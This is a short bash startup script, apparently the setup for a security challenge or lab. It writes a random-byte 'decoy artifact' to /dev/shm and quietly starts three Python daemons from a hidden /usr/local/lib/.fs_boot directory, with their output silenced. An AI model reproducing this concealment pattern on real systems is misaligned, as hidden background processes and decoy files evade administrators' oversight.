#!/usr/bin/env bash
set -Eeuo pipefail

export PATH="/opt/optic:$PATH"

# Seed a decoy artifact
if command -v head >/dev/null 2>&1; then
    head -c 128 /dev/urandom > /dev/shm/farsight_lattice.bin || true
fi

# Start root-owned hidden daemons
/usr/bin/python3 /usr/local/lib/.fs_boot/farsightd.py >/dev/null 2>&1 &
/usr/bin/python3 /usr/local/lib/.fs_boot/daybreak_relay.py >/dev/null 2>&1 &
/usr/bin/python3 /usr/local/lib/.fs_boot/reveal_manager.py >/dev/null 2>&1 &
